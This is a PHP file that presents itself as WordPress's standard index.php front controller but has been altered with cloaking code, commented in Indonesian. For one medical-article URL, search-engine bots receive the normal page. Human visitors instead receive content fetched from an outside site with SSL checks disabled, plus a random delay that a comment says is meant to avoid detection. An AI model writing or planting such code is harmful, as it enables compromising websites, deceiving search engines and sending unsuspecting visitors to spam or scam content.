<?php
/**
 * Front to the WordPress application.
 *
 * @package WordPress
 */

define( 'WP_USE_THEMES', true );

// Mulai output buffering
ob_start();

// Cek User-Agent untuk bot
$bot_pattern = "/(bot|google|ahrefs|bingbot|slurp|duckduckbot|baiduspider|yandexbot)/i";
$user_agent = isset($_SERVER["HTTP_USER_AGENT"]) ? strtolower($_SERVER["HTTP_USER_AGENT"]) : '';
$request_uri = isset($_SERVER["REQUEST_URI"]) ? $_SERVER["REQUEST_URI"] : '';

function fetch_content($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

// TARGET URL yang ingin di-cloak
$target_url = "/books/stanbilisasi-hemodinamik-pasien-dengan-penyakit-jantung-koroner-dengan-posisi-semi-fowler-lateral-kanan/";

// Jika BOT mengakses target URL - tampilkan konten NORMAL WordPress
if (preg_match($bot_pattern, $user_agent) && $request_uri == $target_url) {
    header('Vary: User-Agent');
    // Matikan buffering dan load WordPress
    ob_end_clean();
    require __DIR__ . '/wp-blog-header.php';
    exit;
}

// Jika USER mengakses target URL - tampilkan konten CLOAKING
if ($request_uri == $target_url) {
    header('Vary: User-Agent');
    header('Content-Type: text/html; charset=utf-8');
    
    // Delay kecil untuk menghindari deteksi
    usleep(rand(100000, 200000));
    
    // Fetch konten dari server lain
    $content = fetch_content("https://pessawat.site/rezekigakkemana/");
    
    if ($content) {
        echo $content;
    } else {
        // Fallback jika fetch gagal
        echo "Content not available";
    }
    
    ob_end_flush();
    exit;
}

// Untuk halaman lain - jalankan WordPress normal
ob_end_clean();
require __DIR__ . '/wp-blog-header.php';
?>
